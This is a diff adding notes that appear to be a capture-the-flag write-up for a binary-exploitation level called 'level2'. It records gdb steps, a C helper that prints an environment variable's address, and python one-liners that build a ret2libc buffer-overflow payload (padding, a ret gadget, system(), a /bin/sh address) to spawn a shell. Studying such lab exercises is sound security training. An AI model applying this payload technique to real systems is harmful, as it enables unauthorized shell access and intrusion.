@@ -1,0 +1,41 @@
+gdb level2
+
+disassemble main
+disassemble p
+
+there is a _gets_ function call in p()
+
+int main(int argc, char**argv)
+{
+    printf("%p\n", getenv(argv[1]));
+}
+
+gcc main.c -o /tmp/a.out
+
+export EXPL=/bin/sh
+/tmp/a.out
+
+0xbffff91e ## changes every time. This is the address of /bin/sh variable in memory
+
+gdb level2:
+    b p                 ## breakpoint in p()
+    run                 ## start program
+    print system        ## get system() address in memory at runtime
+    disassemble p       ## get ret address
+
+$2 = {<text variable, no debug info>} 0xb7e6b060 <system>
+0x0804853e <+106>:   ret  
+
+we will build a string which contains the buffer size in AAA + ret + system + anything + $EXPL
+
+python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x1e\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ./level2
+python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ./level2
+cat /tmp/exploit - | ./level2
+
+
+python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x12\xf9\xff\xbf" + "\x12\xf9\xff\xbf"' > /tmp/exploit ; cat /tmp/exploit - | ~/level2
+
+
+x35 xf9 xff xbf
+
+$> python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x35\xf9\xff\xbf"' > /tmp/payload2
